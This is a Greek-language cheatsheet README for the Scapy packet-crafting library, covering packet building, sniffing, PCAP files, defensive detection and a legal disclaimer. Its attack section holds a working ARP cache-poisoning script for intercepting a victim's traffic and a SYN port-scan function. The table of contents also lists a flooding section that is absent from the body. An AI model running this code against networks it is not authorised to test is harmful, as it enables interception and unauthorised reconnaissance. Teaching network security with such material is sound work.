<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy - Ολοκληρωμένο Cheatsheet

[🇹🇷 Türkçe Sürüm](μεταφράσεις/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Επιθέσεις δικτύου">
</p>

<p align="center">
  <b>🐍 Το απόλυτο διαδραστικό εργαλείο χειρισμού πακέτων που βασίζεται σε Python και βιβλιοθήκη ικανή να σφυρηλατήσει, να στείλει, να μυρίσει, να αναλύσει και να θολώσει αυθαίρετα πακέτα δικτύου</b>
</p>

---

## 📋 Πίνακας περιεχομένων

- [Overview & The Stacking Layer Model (`/`)](#-επισκόπηση--the-stacking-layer-model-)
- [Εγκατάσταση] (#-εγκατάσταση)
- [Starting the Interactive Shell](#-starting-the-interactive-shell)
- [Crafting Network Packets] (#-crafting-network-packets)
  - [Χειραψίες IP και TCP] (#ip-and-tcp-handshakes)
  - [ICMP Ping & Traceroute](#icmp-ping--traceroute)
  - [Ερωτήματα και επίλυση DNS](#dns-queries--resolution)
- [Αποστολή & λήψη πακέτων](#-αποστολή--λήψη-πακέτων)
  - [Επίπεδο 3: `send()`, `sr()`, `sr1()`](#layer-3-send-sr-sr1)
  - [Επίπεδο 2: `sendp()`, `srp()`, `srp1()`](#layer-2-sendp-srp-srp1)
- [Packet Sniffing & PCAP Handling] (#-packet-sniffing--pcap-handling)
  - [Capturing Live Packets (`sniff()`)](#capturing-live-packets-sniff)
  - [Ανάγνωση και εγγραφή αρχείων PCAP] (#reading--writing-pcap-files)
- [Επιθετικές επιθέσεις δικτύου] (#-επιθετικές επιθέσεις δικτύου)
  - [ARP Cache Poisoning (MITM)](#arp-cache-poisoning-mitm)
  - [Σενάριο σάρωσης θύρας SYN] (#syn-port-scanning-script)
  - [TCP SYN / ICMP Flooding](#tcp-syn--icmp-flooding)
- [Πίνακας γρήγορης αναφοράς] (#-ταχεία αναφορά-πίνακας)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Νομική αποποίηση ευθυνών](#-νομική αποποίηση ευθυνών)

---

## 🎯 Επισκόπηση και το μοντέλο στοίβαξης επιπέδου (`/`)

Δημιουργήθηκε από τον **Philippe Biondi**, το **Scapy** αντικαθιστά δεκάδες εργαλεία δικτύου μίας χρήσης (ping, traceroute, arpspoof, nmap stubs).

Η ιδιοφυΐα του Scapy έγκειται στη χρήση του τελεστή διαίρεσης της Python (`/`) για τη στοίβαξη των επιπέδων πρωτοκόλλου μεταξύ τους:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Κάθε πεδίο επιπέδου έχει λογικές προεπιλεγμένες τιμές που υπολογίζει αυτόματα το Scapy (αθροίσματα ελέγχου, μήκη, διευθύνσεις MAC, IP πηγής).

---

## 📥 Εγκατάσταση
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 Ξεκινώντας το Διαδραστικό Κέλυφος

Εκκινήστε το διαδραστικό κέλυφος REPL (απαιτούνται δικαιώματα root για τη δημιουργία ακατέργαστων υποδοχών):
```bash
sudo scapy
```
Επιθεωρήστε τα διαθέσιμα πρωτόκολλα και τις λειτουργίες μέσα στο Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ Δημιουργία πακέτων δικτύου

### Χειραψίες IP και TCP
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### ICMP Ping & Traceroute
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### Ερωτήματα και επίλυση DNS
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 Αποστολή & λήψη πακέτων

Το Scapy διαχωρίζει τη μετάδοση με το επίπεδο OSI:

### Επίπεδο 3: `send()`, `sr()`, `sr1()`
Λειτουργεί με κεφαλίδες Ethernet που έχουν εκχωρηθεί από τον πυρήνα (ξεκινά από το επίπεδο IP):
- `send(pkt)`: Μεταδίδει πακέτο στο Layer 3. δεν περιμένει απάντηση.
- `sr(pkt)`: Στέλνει πακέτα και επιστρέφει απαντημένα και αναπάντητα ζεύγη `(ans, unans)`.
- `sr1(pkt)`: Στέλνει πακέτο και επιστρέφει μόνο το πρώτο πακέτο απόκρισης.

### Επίπεδο 2: `sendp()`, `srp()`, `srp1()`
Προσαρμοσμένο πλαίσιο Ethernet/Σύνδεσμος δεδομένων (ξεκινά από το `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: Αποστολή πρωτογενούς πλαισίου Ethernet.
- `srp(Ether() / ARP(...))`: Στείλτε αίτημα ARP και λάβετε απάντηση.

---

## 🔍 Ανίχνευση πακέτων & χειρισμός PCAP

### Λήψη ζωντανών πακέτων (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### Ανάγνωση και εγγραφή αρχείων PCAP
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Επιθετικές επιθέσεις δικτύου

### ARP Cache Poisoning (MITM)
Παραπλανήστε πίνακες ARP για να παρεμποδίσετε την κυκλοφορία μεταξύ θύματος και πύλης:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### Σενάριο σάρωσης θύρας SYN
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ Γρήγορος Πίνακας Αναφοράς

| Στόχος | Εντολή Scapy |
|-----------|---------------|
| **Έναρξη Interactive Shell** | `sudo scapy` |
| **Επιθεώρηση πεδίων πρωτοκόλλου** | `ls(IP)` ή `ls(TCP)` |
| **Αποστολή πακέτου L3** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Αποστολή & λήψη 1ης απάντησης**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Αποστολή L2 Ethernet Frame** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Σνιφ με φίλτρο BPF** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Αποθήκευση στο PCAP** | `wrpcap("out.pcap", pkts)` |
| **Διαβάστε από το PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Αμυντικές Θεωρήσεις & Ανίχνευση

1. **Δυναμική επιθεώρηση ARP (DAI):** Διαμορφώστε τους εταιρικούς διακόπτες με DAI και DHCP Snooping για να απορρίπτετε πλαστές άσκοπες απαντήσεις ARP.
2. **Κανόνες IDS/Suricata:** Γρήγορες μισάνοιχτες σαρώσεις SYN και εσφαλμένοι συνδυασμοί σημαιών TCP (Xmas, NULL) που δημιουργούνται από τυπικές ειδοποιήσεις IDS ενεργοποίησης Scapy.

---

## ⚠️ Νομική αποποίηση ευθύνης

> [!ΠΡΟΣΟΧΗ]
> Το Scapy μπορεί να δημιουργήσει πακέτα με κακή μορφή που προκαλούν συνθήκες άρνησης υπηρεσίας ή υποκλοπούν ιδιωτικά δεδομένα. Πρέπει να χρησιμοποιείται αυστηρά σε εξουσιοδοτημένες αξιολογήσεις ασφαλείας και μεμονωμένα δίκτυα δοκιμών.